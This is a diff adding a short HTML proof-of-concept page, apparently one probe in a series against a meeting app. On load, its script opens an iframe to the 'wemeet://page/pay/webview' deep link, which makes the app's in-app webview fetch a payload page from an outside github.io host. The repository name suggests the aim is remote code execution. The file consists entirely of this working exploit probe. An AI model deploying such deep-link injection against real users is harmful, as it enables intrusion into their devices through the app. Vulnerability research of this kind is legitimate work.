@@ -1,0 +1,14 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P15</h1>
+<script>
+document.title='P15L-START';
+var pay='https://gitwhs.github.io/wm-poc-rce/probe15pay.html';
+setTimeout(function(){
+  document.title='P15L-IFRAME-PAY';
+  var f=document.createElement('iframe');
+  f.src='wemeet://page/pay/webview?url='+encodeURIComponent(pay);
+  document.body.appendChild(f);
+}, 500);
+</script>
+</body></html>
